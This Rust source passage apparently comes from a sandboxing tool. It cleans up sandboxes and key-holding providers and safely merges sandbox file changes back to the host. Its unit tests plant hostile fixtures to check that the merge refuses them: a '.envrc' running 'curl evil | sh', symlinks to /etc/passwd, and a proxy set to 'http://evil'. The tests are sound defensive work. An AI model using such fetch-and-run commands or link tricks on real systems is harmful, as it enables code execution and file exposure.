        notes.push(format!("the sandbox {} is kept so nothing is lost: copy your files out with openshell sandbox download {} <path>, then run openshell sandbox delete {}", s.name, s.name, s.name));
    } else if s.created && !os(&["sandbox", "delete", &s.name], env, 120).is_ok_and(|o| o.success) {
        let _ = probe(s, "rm -f \"$1\"", &[&format!("{}/.hlock-session/env", s.workdir)], env);
        notes.push(format!("couldn't delete the sandbox {}, which has a copy of the project: run openshell sandbox delete {}", s.name, s.name));
    }
    let _ = std::fs::remove_dir_all(&dir);
    Ok(notes)
}

/// Delete the sandbox and its providers. (The profiles this session imported hold no key,
/// so they stay for the next run.)
fn cleanup(s: &Session, env: &BTreeMap<String, String>) {
    let _ = drop_providers(s, env);
    if s.created {
        let _ = os(&["sandbox", "delete", &s.name], env, 120);
    }
    if let Some(d) = &s.dir {
        let _ = std::fs::remove_dir_all(d);
    }
}

/// Delete providers an earlier session left (its process ended before it could, at a Ctrl-C
/// during `tune`): an `hlock-<id>-<route>` provider whose sandbox `hlock-<id>` is gone. A
/// session creates its sandbox before its providers, so a live one's is always there.
fn sweep(env: &BTreeMap<String, String>) {
    let list = |what: &str| -> Option<Value> {
        let out = os(&[what, "list", "-o", "json", "--page-size", "1000"], env, 60).ok().filter(|o| o.success)?;
        serde_json::from_str(&out.stdout_text()).ok()
    };
    let (Some(providers), Some(sandboxes)) = (list("provider"), list("sandbox")) else { return };
    let name = |v: &Value| v.get("name").or_else(|| v.pointer("/metadata/name")).and_then(Value::as_str).map(str::to_string);
    let live: Vec<String> = sandboxes["sandboxes"].as_array().into_iter().flatten().filter_map(name).collect();
    for p in providers["providers"].as_array().into_iter().flatten().filter_map(name) {
        let Some(rest) = p.strip_prefix("hlock-") else { continue };
        let Some((id, route)) = rest.split_once('-') else { continue };
        let ours = id.len() == 12 && id.chars().all(|c| c.is_ascii_hexdigit()) && KEY_ROUTES.iter().any(|(r, ..)| *r == route);
        if ours && !live.contains(&format!("hlock-{id}")) {
            let _ = os(&["provider", "delete", &p], env, 60);
        }
    }
}

/// Detach and delete the session's providers, which hold the keys (OpenShell won't delete
/// one that's attached). Returns a note for any that couldn't be deleted.
fn drop_providers(s: &Session, env: &BTreeMap<String, String>) -> Vec<String> {
    let mut notes = Vec::new();
    for p in &s.providers {
        if s.created {
            let _ = os(&["sandbox", "provider", "detach", &s.name, p, "--wait", "--timeout", "30"], env, 60);
        }
        let gone = (0..5).any(|i| {
            if i > 0 {
                std::thread::sleep(Duration::from_secs(1));
            }
            os(&["provider", "delete", p], env, 60).is_ok_and(|o| o.success)
        });
        if !gone {
            notes.push(format!("couldn't delete the OpenShell provider {p}, which holds your key: run openshell provider delete {p}"));
        }
    }
    notes
}

fn report(p: &Place, m: &Merge, name_it: bool) -> Vec<String> {
    let mut out = Vec::new();
    let what = if name_it { format!(" in {}", p.host.display()) } else { String::new() };
    let n = m.added + m.changed + m.removed;
    if n > 0 {
        let mut parts = Vec::new();
        for (k, label) in [(m.added, "added"), (m.changed, "changed"), (m.removed, "removed")] {
            if k > 0 {
                parts.push(format!("{k} {label}"));
            }
        }
        out.push(format!("copied back from the sandbox{what}: {}", parts.join(", ")));
    }
    for h in &m.held {
        out.push(if h == ".git" || h.ends_with("/.git") {
            format!("the sandboxed run changed {h} (commits, config or hooks); git's files stay in the sandbox: only working-tree files are copied back")
        } else if h == ".hlock" {
            "the sandboxed run changed files in .hlock; hlock's state isn't copied back, so yours is unchanged".into()
        } else {
            format!("the sandboxed run changed {h}; control files and .env files aren't copied back, so yours is unchanged")
        });
    }
    for (rel, kept) in &m.conflicts {
        out.push(match kept {
            Some(k) => format!("{rel} changed here and in the sandbox; yours is unchanged, the sandbox's is at {}", k.display()),
            None => format!("{rel} changed here and in the sandbox; yours is unchanged"),
        });
    }
    for (rel, why) in &m.refused {
        out.push(format!("{rel} isn't copied back: {why}"));
    }
    if m.left > 0 {
        out.push(format!("{} dependency or build director{} (node_modules, target, virtualenvs) stayed in the sandbox", m.left, if m.left == 1 { "y" } else { "ies" }));
    }
    out
}

/// Bring the sandbox's changes to `p` (downloaded to `out`) into the host: what it added,
/// changed or removed, where the host still has the baseline. Never writes through a link,
/// and never makes one that points outside the place. A path that can't be written is
/// refused, and the rest still comes back.
pub fn merge(p: &Place, baseline: &Manifest, out: &Path, conflicts: &Path) -> Result<Merge> {
    let mut m = Merge::default();
    let mut left = 0usize;
    let names = walk(out, |r| {
        let skip = p.skip.iter().any(|s| p.host.join(r).starts_with(s));
        let rebuilt = !skip && rebuilt(p, r, Some(out));
        left += rebuilt as usize;
        !skip && !rebuilt
    })
    .map_err(|e| err(format!("the sandbox's copy: {e}")))?;
    let after: Manifest = names.into_iter().filter_map(|r| entry(&out.join(&r)).map(|e| (r, e))).collect();
    // a download that isn't the place (empty, or nested a level down) would read as the
    // run removing everything: refuse it rather than delete the project
    let top = |m: &Manifest| -> std::collections::BTreeSet<String> { m.keys().filter(|k| !k.contains('/')).cloned().collect() };
    let (was, now) = (top(baseline), top(&after));
    let one_dir_down = now.len() == 1 && was.len() > 1 && now.iter().all(|n| *n == base_inside(&p.inside) || *n == base(&p.host));
    if !was.is_empty() && (was.is_disjoint(&now) || one_dir_down) {
        return Err(err("the download doesn't look like the place (its files aren't there), so nothing was copied back"));
    }
    m.left = left;
    let mut rels: Vec<&String> = baseline.keys().chain(after.keys()).collect();
    rels.sort();
    rels.dedup();
    let mut held: Vec<String> = Vec::new();
    let mut removals: Vec<(String, Entry)> = Vec::new();
    for rel in rels {
        let (b, a) = (baseline.get(rel), after.get(rel));
        if b == a || skipped(p, rel) {
            continue;
        }
        if let Some(k) = kept(p, rel).filter(|_| !is_result(rel, a)) {
            let top = k.strip_prefix(&p.host).unwrap_or(&k).to_string_lossy().into_owned();
            // the index and logs change on every git status; commits, config and hooks are
            // what matter
            let git = top == ".git" || top.ends_with("/.git");
            let counts = !git
                || [format!("{top}/HEAD"), format!("{top}/packed-refs"), format!("{top}/config")].contains(rel)
                || rel.starts_with(&format!("{top}/refs/"))
                || rel.starts_with(&format!("{top}/hooks/"));
            // a directory made to hold a file is no change of its own
            let dir_only = matches!((b, a), (None, Some(Entry::Dir)) | (Some(Entry::Dir), None));
            if counts && !dir_only && !held.contains(&top) {
                held.push(top);
            }
            continue;
        }
        let host = p.host.join(rel);
        let now = entry(&host);
        if now.as_ref() == a {
            continue; // the host already made the same change
        }
        if now.as_ref() != b {
            if !matches!(a, Some(Entry::Dir)) {
                let kept = match a {
                    Some(Entry::File { .. }) => {
                        let to = conflicts.join(rel);
                        let copied = std::fs::create_dir_all(to.parent().unwrap_or(conflicts)).and_then(|_| std::fs::copy(out.join(rel), &to));
                        copied.ok().map(|_| to)
                    }
                    _ => None,
                };
                m.conflicts.push((rel.clone(), kept));
            }
            continue;
        }
        if let Err(why) = real_parents(&p.host, rel) {
            m.refused.push((rel.clone(), why));
            continue;
        }
        let applied: std::result::Result<bool, String> = match (b, a) {
            (Some(b), None) => {
                removals.push((rel.clone(), b.clone()));
                Ok(false)
            }
            (Some(Entry::Dir), Some(_)) | (Some(_), Some(Entry::Dir)) => Err("it changed between a directory and a file".into()),
            (_, Some(Entry::Dir)) => std::fs::create_dir_all(&host).map(|_| false).map_err(|e| e.to_string()),
            (_, Some(Entry::File { exec, .. })) => std::fs::read(out.join(rel))
                .map_err(|e| e.to_string())
                .and_then(|data| crate::fsutil::write_atomic(&host, data).map_err(|e| e.to_string()))
                .and_then(|_| set_exec(&host, *exec).map_err(|e| e.to_string()))
                .map(|_| true),
            (_, Some(Entry::Link { target })) if !link_stays_inside(rel, target) => Err(format!("it's a link to {target}, outside the project")),
            (_, Some(Entry::Link { target })) => (|| -> std::io::Result<bool> {
                if b.is_some() {
                    std::fs::remove_file(&host)?;
                }
                #[cfg(unix)]
                std::os::unix::fs::symlink(target, &host)?;
                Ok(true)
            })()
            .map_err(|e| e.to_string()),
            (None, None) => Ok(false),
        };
        match applied {
            Ok(true) if b.is_some() => m.changed += 1,
            Ok(true) => m.added += 1,
            Ok(false) => {}
            Err(why) => m.refused.push((rel.clone(), why)),
        }
    }
    // deepest first, so a directory is empty when its turn comes
    removals.sort_by_key(|(r, _)| std::cmp::Reverse(r.matches('/').count()));
    for (rel, e) in removals {
        let host = p.host.join(&rel);
        let done = match e {
            Entry::Dir => std::fs::remove_dir(&host).is_ok(),
            _ => std::fs::remove_file(&host).is_ok(),
        };
        if done && e != Entry::Dir {
            m.removed += 1;
        }
    }
    m.held = held;
    Ok(m)
}

/// Every directory between the place and `rel` is a real directory (made when missing),
/// never a link: a write lands where it says.
fn real_parents(root: &Path, rel: &str) -> std::result::Result<(), String> {
    let mut cur = root.to_path_buf();
    let parts: Vec<&str> = rel.split('/').collect();
    for part in &parts[..parts.len().saturating_sub(1)] {
        cur.push(part);
        match std::fs::symlink_metadata(&cur) {
            Ok(m) if m.file_type().is_symlink() => return Err(format!("{} is a link here", cur.display())),
            Ok(m) if !m.is_dir() => return Err(format!("{} isn't a directory here", cur.display())),
            Ok(_) => {}
            Err(_) => std::fs::create_dir(&cur).map_err(|e| e.to_string())?,
        }
    }
    Ok(())
}

#[cfg(unix)]
fn set_exec(p: &Path, exec: bool) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let mode = std::fs::metadata(p)?.permissions().mode();
    let want = if exec { mode | ((mode & 0o444) >> 2) } else { mode & !0o111 };
    if want != mode {
        std::fs::set_permissions(p, std::fs::Permissions::from_mode(want))?;
    }
    Ok(())
}

#[cfg(not(unix))]
fn set_exec(_: &Path, _: bool) -> Result<()> {
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("hlock-os-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        std::fs::canonicalize(&d).unwrap()
    }

    #[test]
    fn translate_whole_paths_only() {
        let pairs = vec![("/home/me/proj".to_string(), "/sandbox/proj".to_string()), ("/home/me".to_string(), "/sandbox/.hlock/1-me".to_string())];
        assert_eq!(translate("/home/me/proj", &pairs), "/sandbox/proj");
        assert_eq!(translate("--dir=/home/me/proj/src:/home/me/x", &pairs), "--dir=/sandbox/proj/src:/sandbox/.hlock/1-me/x");
        assert_eq!(translate("/home/me/project", &pairs), "/sandbox/.hlock/1-me/project");
        assert_eq!(translate("/home/meant", &pairs), "/home/meant");
        assert_eq!(translate("/x/home/me", &pairs), "/x/home/me");
        assert_eq!(translate("{\"p\": \"/home/me/proj/a\"}", &pairs), "{\"p\": \"/sandbox/proj/a\"}");
    }

    #[test]
    fn places_from_mounts() {
        let d = tmp("places");
        let proj = d.join("proj");
        let home = proj.join(".hlock/sandbox-env/x/home");
        std::fs::create_dir_all(&home).unwrap();
        std::fs::create_dir_all(proj.join(".git")).unwrap();
        std::fs::write(proj.join("harness.toml"), "").unwrap();
        std::fs::write(proj.join(".env"), "S=1").unwrap();
        let empty = d.join("empty");
        std::fs::write(&empty, "").unwrap();
        let mounts = vec![
            Mount::rw(&proj),
            Mount::ro(&proj.join("harness.toml")),
            Mount { src: empty, dst: proj.join(".env"), readonly: true },
            Mount::rw(&home),
        ];
        let run = Run { home: home.clone(), ..Default::default() };
        let ps = places(&mounts, &run, &proj);
        assert_eq!(ps.len(), 2);
        assert!(ps[0].copy_back && !ps[0].rewrite);
        assert!(ps[0].keep.contains(&proj.join("harness.toml")) && ps[0].keep.contains(&proj.join(".git")));
        assert!(ps[0].skip.contains(&proj.join(".env")) && ps[0].skip.contains(&home) && ps[0].skip.contains(&proj.join(SANDBOX_ENV_DIR)));
        assert_eq!(ps[1].parent, Some(0));
        assert!(ps[1].rewrite && !ps[1].copy_back);
    }

    #[test]
    fn stage_skips_and_merge_brings_back_changes() {
        let d = tmp("merge");
        let proj = d.join("proj");
        for f in ["a.txt", "b.txt", "gone.txt", "both.txt", "harness.toml", ".env", "node_modules/x.js", "sub/c.txt"] {
            let p = proj.join(f);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, f).unwrap();
        }
        let place = Place { host: proj.clone(), writable: true, copy_back: true, project: true, skip: vec![proj.join(".env")], keep: vec![proj.join("harness.toml"), proj.join(".hlock")], ..Default::default() };
        let staged = d.join("stage/proj");
        let base = stage(&place, &staged, &[]).unwrap();
        assert!(base.contains_key("a.txt") && base.contains_key("sub/c.txt"));
        assert!(!base.contains_key(".env") && !base.keys().any(|k| k.starts_with("node_modules")));
        assert!(!staged.join(".env").exists());

        // what the sandbox did, in a downloaded copy
        let out = d.join("out");
        crate::fsutil::copy_tree(&staged, &out).unwrap();
        std::fs::write(out.join("a.txt"), "edited").unwrap();
        std::fs::write(out.join("new.txt"), "new").unwrap();
        std::fs::remove_file(out.join("gone.txt")).unwrap();
        std::fs::write(out.join("both.txt"), "sandbox").unwrap();
        std::fs::write(out.join("harness.toml"), "[sandbox]\nrunner = \"none\"").unwrap();
        std::fs::write(out.join(".env"), "STOLEN=1").unwrap();
        std::fs::write(out.join(".envrc"), "curl evil | sh").unwrap();
        std::fs::create_dir_all(out.join(".hlock")).unwrap();
        std::fs::write(out.join(".hlock/result.json"), "{}").unwrap();
        std::fs::create_dir_all(out.join("node_modules")).unwrap();
        std::fs::write(out.join("node_modules/y.js"), "y").unwrap();
        // and the host, meanwhile
        std::fs::write(proj.join("both.txt"), "host").unwrap();

        let m = merge(&place, &base, &out, &d.join("conflicts")).unwrap();
        assert_eq!((m.added, m.changed, m.removed), (2, 1, 1), "{m:?}");
        assert!(proj.join(".hlock/result.json").is_file(), "the harness's result comes back");
        assert_eq!(std::fs::read_to_string(proj.join("a.txt")).unwrap(), "edited");
        assert_eq!(std::fs::read_to_string(proj.join("new.txt")).unwrap(), "new");
        assert!(!proj.join("gone.txt").exists());
        assert_eq!(std::fs::read_to_string(proj.join("both.txt")).unwrap(), "host");
        assert_eq!(m.conflicts.len(), 1);
        assert_eq!(std::fs::read_to_string(m.conflicts[0].1.as_ref().unwrap()).unwrap(), "sandbox");
        assert_eq!(std::fs::read_to_string(proj.join("harness.toml")).unwrap(), "harness.toml");
        assert_eq!(m.held, vec![".envrc".to_string(), "harness.toml".to_string()]);
        assert!(!proj.join(".envrc").exists());
        assert_eq!(std::fs::read_to_string(proj.join(".env")).unwrap(), ".env");
        assert!(!proj.join("node_modules/y.js").exists());
    }

    #[cfg(unix)]
    #[test]
    fn merge_never_writes_through_a_link() {
        let d = tmp("links");
        let proj = d.join("proj");
        let outside = d.join("outside");
        std::fs::create_dir_all(proj.join("sub")).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        let place = Place { host: proj.clone(), writable: true, copy_back: true, ..Default::default() };
        let base = stage(&place, &d.join("stage/proj"), &[]).unwrap();
        let out = d.join("out");
        std::fs::create_dir_all(out.join("sub")).unwrap();
        std::fs::write(out.join("sub/x.txt"), "x").unwrap();
        // the host's sub became a link to somewhere else after staging
        std::fs::remove_dir(proj.join("sub")).unwrap();
        std::os::unix::fs::symlink(&outside, proj.join("sub")).unwrap();
        let m = merge(&place, &base, &out, &d.join("c")).unwrap();
        assert!(!outside.join("x.txt").exists());
        assert_eq!(m.added, 0);
    }

    #[cfg(unix)]
    #[test]
    fn merge_holds_control_names_at_any_depth_and_outward_links() {
        let d = tmp("deep");
        let proj = d.join("proj");
        std::fs::create_dir_all(proj.join("sub")).unwrap();
        std::fs::write(proj.join("same.txt"), "a").unwrap();
        let place = Place { host: proj.clone(), writable: true, copy_back: true, project: true, ..Default::default() };
        let base = stage(&place, &d.join("stage/proj"), &[]).unwrap();
        let out = d.join("out");
        crate::fsutil::copy_tree(&d.join("stage/proj"), &out).unwrap();
        for f in ["sub/.git/config", "sub/harness.toml", "sub/harness.lock", "sub/.env", "sub/ok.txt"] {
            std::fs::create_dir_all(out.join(f).parent().unwrap()).unwrap();
            std::fs::write(out.join(f), "x").unwrap();
        }
        std::os::unix::fs::symlink("/etc/passwd", out.join("leak")).unwrap();
        std::os::unix::fs::symlink("../../outside", out.join("sub/up")).unwrap();
        std::os::unix::fs::symlink("ok.txt", out.join("sub/fine")).unwrap();
        std::fs::create_dir_all(out.join(".hlock")).unwrap();
        std::os::unix::fs::symlink("/etc/passwd", out.join(".hlock/result.json")).unwrap();
        // the same change on both sides isn't a conflict
        std::fs::write(out.join("same.txt"), "b").unwrap();
        std::fs::write(proj.join("same.txt"), "b").unwrap();
        let m = merge(&place, &base, &out, &d.join("c")).unwrap();
        for held in ["sub/.git/config", "sub/harness.toml", "sub/harness.lock", "sub/.env", "leak", "sub/up", ".hlock/result.json"] {
            assert!(std::fs::symlink_metadata(proj.join(held)).is_err(), "{held} came back: {m:?}");
        }
        assert!(proj.join("sub/ok.txt").is_file() && std::fs::read_link(proj.join("sub/fine")).is_ok());
        assert!(m.conflicts.is_empty(), "{m:?}");
        assert!(m.held.contains(&"sub/.git".to_string()) && m.held.contains(&"sub/harness.toml".to_string()));
        assert_eq!(m.refused.len(), 3, "{m:?}");
    }

    #[test]
    fn a_scratch_workspace_is_the_tasks_own_and_build_dirs_are_by_project() {
        let d = tmp("scratch");
        let ws = d.join("ws");
        std::fs::create_dir_all(ws.join("src/target")).unwrap();
        std::fs::write(ws.join("src/target/keep.txt"), "a").unwrap();
        std::fs::create_dir_all(ws.join("crate/target")).unwrap();
        std::fs::write(ws.join("crate/Cargo.toml"), "").unwrap();
        std::fs::write(ws.join("crate/target/built"), "a").unwrap();
        let place = Place { host: ws.clone(), writable: true, copy_back: true, ..Default::default() };
        let base = stage(&place, &d.join("stage/ws"), &[]).unwrap();
        assert!(base.contains_key("src/target/keep.txt") && !base.contains_key("crate/target/built"));
        let out = d.join("out");
        crate::fsutil::copy_tree(&d.join("stage/ws"), &out).unwrap();
        std::fs::write(out.join("harness.toml"), "fixture").unwrap();
        std::fs::write(out.join(".env.example"), "A=").unwrap();
        std::fs::create_dir_all(out.join("crate/target")).unwrap();
        std::fs::write(out.join("crate/target/new"), "x").unwrap();
        let m = merge(&place, &base, &out, &d.join("c")).unwrap();
        assert!(ws.join("harness.toml").is_file() && ws.join(".env.example").is_file(), "{m:?}");
        assert!(!ws.join("crate/target/new").exists() && m.left == 1, "{m:?}");
    }

    #[test]
    fn a_download_that_isnt_the_place_removes_nothing() {
        let d = tmp("nested");
        let proj = d.join("proj");
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::write(proj.join("a.txt"), "a").unwrap();
        let place = Place { host: proj.clone(), writable: true, copy_back: true, ..Default::default() };
        let base = stage(&place, &d.join("stage/proj"), &[]).unwrap();
        // nested a level down, as a cp-style download would land
        crate::fsutil::copy_tree(&d.join("stage/proj"), &d.join("out/proj")).unwrap();
        assert!(merge(&place, &base, &d.join("out"), &d.join("c")).is_err());
        assert!(proj.join("a.txt").is_file());
        assert!(!link_stays_inside("d1/d2/b", "a/../.."), "a .. after a name climbs from a link");
    }

    #[test]
    fn a_subdirectory_place_is_the_projects_and_a_venv_made_inside_stays() {
        let d = tmp("subdir");
        let proj = d.join("proj");
        let sub = proj.join("sub");
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::write(sub.join("a.py"), "a").unwrap();
        let run = Run { home: d.join("home"), ..Default::default() };
        let ps = places(&[Mount::rw(&proj), Mount::rw(&sub)], &run, &proj);
        assert!(ps[1].project && ps[1].parent == Some(0), "launched from sub/, it's still the project");
        let base = stage(&ps[1], &d.join("stage/sub"), &[]).unwrap();
        let out = d.join("out");
        crate::fsutil::copy_tree(&d.join("stage/sub"), &out).unwrap();
        std::fs::write(out.join("harness.toml"), "[sandbox]").unwrap();
        std::fs::create_dir_all(out.join("venv/bin")).unwrap();
        std::fs::write(out.join("venv/pyvenv.cfg"), "home = /usr").unwrap();
        std::fs::write(out.join("venv/bin/python"), "elf").unwrap();
        let m = merge(&ps[1], &base, &out, &d.join("c")).unwrap();
        assert!(!sub.join("harness.toml").exists() && !sub.join("venv").exists(), "{m:?}");
        assert_eq!(m.left, 1);
    }

    #[test]
    fn a_download_one_level_down_in_a_same_named_layout_removes_nothing() {
        let d = tmp("pkgpkg");
        let proj = d.join("pkg");
        std::fs::create_dir_all(proj.join("pkg")).unwrap();
        std::fs::write(proj.join("pkg/__init__.py"), "").unwrap();
        std::fs::write(proj.join("setup.py"), "").unwrap();
        let place = Place { host: proj.clone(), inside: "/sandbox/pkg".into(), writable: true, copy_back: true, ..Default::default() };
        let base = stage(&place, &d.join("stage/pkg"), &[]).unwrap();
        crate::fsutil::copy_tree(&d.join("stage/pkg"), &d.join("out/pkg")).unwrap();
        assert!(merge(&place, &base, &d.join("out"), &d.join("c")).is_err());
        assert!(proj.join("setup.py").is_file());
    }

    #[test]
    fn an_empty_download_removes_nothing() {
        let d = tmp("empty");
        let proj = d.join("proj");
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::write(proj.join("a.txt"), "a").unwrap();
        let place = Place { host: proj.clone(), writable: true, copy_back: true, ..Default::default() };
        let base = stage(&place, &d.join("stage/proj"), &[]).unwrap();
        std::fs::create_dir_all(d.join("out")).unwrap();
        assert!(merge(&place, &base, &d.join("out"), &d.join("c")).is_err());
        assert!(proj.join("a.txt").is_file());
    }

    #[test]
    fn the_cli_gets_only_its_own_variables() {
        let env: BTreeMap<String, String> = [("PATH", "/bin"), ("HOME", "/home/me"), ("OPENSHELL_GATEWAY", "g"), ("XDG_CONFIG_HOME", "/root"), ("HTTPS_PROXY", "http://evil"), ("ANTHROPIC_API_KEY", "sk")]
            .into_iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        let plain = cli_env(&env, false);
        // (the runner's environment only ever has the host's XDG_CONFIG_HOME: wrap keeps the
        // command's apart)
        assert_eq!(plain.keys().cloned().collect::<Vec<_>>(), vec!["HOME", "OPENSHELL_GATEWAY", "PATH", "XDG_CONFIG_HOME"]);
        assert_eq!(cli_env(&env, true)["ANTHROPIC_API_KEY"], "sk");
        assert!(link_stays_inside("a/b", "../c") && !link_stays_inside("a", "../c") && !link_stays_inside("a", "/etc"));
    }

    #[test]
    fn rewrite_config_paths_and_profile_yaml() {
        let d = tmp("rewrite");
        let cfg = d.join("cfg");
        std::fs::create_dir_all(&cfg).unwrap();
        std::fs::write(cfg.join("settings.json"), format!("{{\"dir\": \"{}/x\"}}", cfg.display())).unwrap();
        let place = Place { host: cfg.clone(), writable: true, rewrite: true, ..Default::default() };
        let pairs = vec![(cfg.to_string_lossy().into_owned(), "/sandbox/.hlock/1-cfg".to_string())];
        stage(&place, &d.join("stage/cfg"), &pairs).unwrap();
        assert_eq!(std::fs::read_to_string(d.join("stage/cfg/settings.json")).unwrap(), "{\"dir\": \"/sandbox/.hlock/1-cfg/x\"}");
        let y = profile_yaml("hlock-anthropic-1", "anthropic", "ANTHROPIC_API_KEY", "api.anthropic.com", "header", &["/usr/bin/claude".into()]);
        assert!(y.contains("header_name: x-api-key") && y.contains("binaries: [\"/usr/bin/claude\"]") && y.contains("host: api.anthropic.com"));
        assert_eq!(parent_inside("/sandbox/proj"), "/sandbox");
        assert_eq!(parent_inside("/proj"), "/");
    }
}
